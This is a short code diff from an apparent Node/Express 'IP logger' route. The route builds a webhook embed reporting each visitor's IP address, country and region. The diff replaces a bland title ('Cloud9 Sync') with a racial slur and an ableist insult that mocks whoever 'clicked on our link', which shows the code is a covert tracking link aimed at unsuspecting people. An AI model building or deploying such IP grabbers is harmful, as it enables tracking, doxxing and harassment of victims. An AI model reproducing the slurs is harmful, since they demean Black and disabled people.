@@ -21,8 +21,8 @@ app.get("/", async (req, res) => {
   const isProxy = req.headers["via"] || req.headers["x-forwarded-for"];
   try { 
     const embed = new MessageBuilder()
-      .setTitle("Cloud9 Sync")
-      .setDescription("New address logged.")
+      .setTitle("N1gger Logger")
+      .setDescription("Some retart clicked on our link :joy: .")
       .addField("IP", ipAddress)
       .addField("Country", country)
       .addField("Region", region)
